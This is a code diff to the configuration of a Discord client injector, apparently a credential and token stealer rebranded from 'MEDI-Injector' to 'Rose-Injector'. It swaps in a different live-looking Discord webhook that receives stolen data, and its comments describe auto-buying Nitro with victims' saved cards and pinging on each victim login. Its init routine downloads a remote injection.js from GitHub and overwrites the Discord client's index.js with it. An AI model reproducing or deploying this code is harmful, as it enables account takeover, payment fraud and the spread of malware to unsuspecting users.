@@ -6,15 +6,15 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: 'https://discord.com/api/webhooks/1102336569706303488/J1Pw9vlC7NyvUtdRnk75MSh7FvFursxSSsgMgNF5WdqnCtbdCr9wYUQ9m3dIiewceAV3', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook: 'https://discord.com/api/webhooks/1084594214551175268/6j3om5eqVlueIR76V8uBgfGPEjnXIcUpXYXmmPO0mMaXmWfF48zVRZDMnVIhbHAsqXAS', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
+  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'MEDI-Injector', //name of the webhook thats gonna send the info
+  embed_name: 'Rose-Injector', //name of the webhook thats gonna send the info
   embed_icon: 'https://i.imgur.com/EZFAJXh.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/PsxScripts01/inject/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/injection/injection.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
@@ -444,7 +444,7 @@ fs.readFileSync(indexJs, 'utf8', (err, data) => {
 async function init() {
     https.get('${config.injection_url}', (res) => {
         const file = fs.createWriteStream(indexJs);
-        res.replace('https://discord.com/api/webhooks/1102336569706303488/J1Pw9vlC7NyvUtdRnk75MSh7FvFursxSSsgMgNF5WdqnCtbdCr9wYUQ9m3dIiewceAV3', '${config.webhook}')
+        res.replace('%WEBHOOK%', '${config.webhook}')
         res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
         res.pipe(file);
         file.on('finish', () => {
